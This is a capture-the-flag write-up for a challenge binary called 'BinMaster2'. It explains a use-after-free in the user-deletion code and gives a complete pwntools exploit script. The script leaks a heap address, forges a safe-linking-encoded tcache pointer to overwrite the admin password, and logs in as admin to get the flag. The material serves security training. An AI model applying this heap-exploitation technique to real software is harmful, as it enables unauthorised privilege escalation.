# BinMaster2

The vulnerability in this binary is a use after free. The binary when deleting a user doesent nullify the pointer to the user. This allows us to read the user heap chunk and therefore leak the address of the heap.


```c
case 3:
        printf("Slot > ");
        slot = get_int(0x10u);
        if ( !slot )
          goto LABEL_13;
        if ( (unsigned int)delete_user(slot) )
          puts("There's no user in that slot");
        else
          puts("User deleted");
        break;
```

In the next iteration it will still print the information as if we are logged in. This is because the pointer to the user is still valid.

Parsing that information and knowing that the first heap chunk allocated is the admin chunk and ALWAYS starts at 0x----2a0 we can force a new user to allocate within the password field of the admin and change it, and then log in as admin.

```py
  from pwn import *
from pwn import p64,u64

e = ELF('./bin_master_2',checksec=False)
p = e.process()

#add user
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#login
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#delete myself
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'>', b'1')


#parse the heap
p.recvuntil(b'Welcome ')
leak = p.recvline().strip()
leak = u64(leak.ljust(8,b'\x00'))
next = leak<<12
next += 0x320
payload = next ^ leak
print(f"leak: {leak}")
payload = p64(payload)

#concatenate the heap chunks
p.sendlineafter(b'>', b'5')
p.sendafter(b':',payload)

#now adding the user modifies the admin password
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#login as admin
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'admin')
p.sendlineafter(b':', b'ciao')

#flag
p.sendlineafter(b'>', b'4')



p.interactive()


```